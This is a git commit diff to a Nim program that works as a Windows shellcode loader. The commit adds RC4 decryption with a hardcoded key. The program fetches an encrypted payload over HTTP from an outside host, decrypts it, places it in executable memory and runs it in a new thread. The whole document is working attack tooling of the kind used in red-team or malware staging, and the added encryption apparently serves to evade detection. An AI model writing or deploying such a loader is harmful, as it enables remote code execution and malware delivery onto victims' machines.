1a3257ca880fee69b007d1b390b40c92decbf226
had <85348372+hadhub@users.noreply.github.com>
2024-07-26 00:56:49 +0100

    Update main.nim
    Add RC4

--- main.nim
+++ main.nim
@@ -1,29 +1,33 @@
+import RC4
 import httpclient
 import winim/lean
 
-var 
-    custom_proxy    = newProxy(url="http://PROXY_IP:PORT")
-    client          = newHttpClient(proxy=custom_proxy)
-    shellcode       = newseq[byte]()
-    data            : string
-    old_protect     : DWORD = PAGE_READWRITE
+var
+    custom_proxy = newProxy(url="http://PROXY_IP:PORT")
+    old_protect : DWORD = PAGE_READWRITE
+    client      = newHttpClient(proxy=custom_proxy)
+    shellcode   = newseq[byte]()
+    data        : string
+    key         : string = "wutai.vl"
+    dec         : string
 
 func toByteSeq*(str: string): seq[byte] {.inline.} =
     @(str.toOpenArrayByte(0, str.high))
 
-
-proc lets_run_that(): void = 
-    data = client.getContent("http://LHOST:LPORT/shellcode")
+proc main(): void = 
+    data = client.getContent("http://192.168.198.128:8000/api")
     client.close()
-    shellcode = toByteSeq(data)
+    dec = fromRC4(key, data)
+    shellcode = toByteSeq(dec)
+    
     var shellcode_len = cast[SIZE_T](len(shellcode))
     var buffer = VirtualAlloc(nil, shellcode_len, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
     CopyMemory(buffer, &shellcode[0], shellcode_len);
     VirtualProtect(shellcode[0].addr, shellcode_len, PAGE_EXECUTE_READWRITE, oldProtect.addr)
-    var create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
-    WaitForSingleObject(create_thread,-1)
+    let create_thread : HANDLE = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](buffer), NULL, 0, NULL)
+    WaitForSingleObject(create_thread, INFINITE)
     CloseHandle(create_thread)
 
 
 when isMainModule:
-    lets_run_that()
+    main()
